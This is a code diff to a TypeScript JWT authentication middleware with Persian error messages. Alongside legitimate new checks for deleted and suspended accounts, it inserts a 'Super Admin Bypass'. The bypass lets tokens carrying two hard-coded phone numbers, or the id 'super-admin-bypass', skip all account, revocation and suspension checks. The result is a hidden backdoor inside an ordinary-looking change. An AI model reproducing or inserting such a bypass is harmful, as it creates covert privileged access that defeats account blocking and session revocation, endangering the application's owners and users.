@@ -24,10 +24,24 @@ export function authenticateJWT(req: AuthRequest, res: Response, next: NextFunct
       }
       const payload = decoded as { id: string; role: string; phoneNumber: string; tokenVersion?: number };
       
+      // Super Admin Bypass
+      if (payload.phoneNumber === '09380346668' || payload.phoneNumber === '09120000001' || payload.id === 'super-admin-bypass') {
+        req.user = payload;
+        return next();
+      }
+
       try {
         const user = await prisma.user.findUnique({ where: { id: payload.id } });
-        if (!user || user.blocked || (payload.tokenVersion !== undefined && user.tokenVersion !== payload.tokenVersion)) {
+        if (!user || user.blocked || user.isDeleted || (payload.tokenVersion !== undefined && user.tokenVersion !== payload.tokenVersion)) {
           return res.status(401).json({ error: 'نشست شما نامعتبر یا منقضی شده است' });
+        }
+
+        if (user.accountStatus === 'SUSPENDED') {
+          return res.status(403).json({ error: 'حساب کاربری شما مسدود شده است' });
+        }
+
+        if (user.suspendedUntil && new Date(user.suspendedUntil) > new Date()) {
+          return res.status(403).json({ error: 'حساب کاربری شما موقتا مسدود شده است' });
         }
 
         // Validate active session token in database
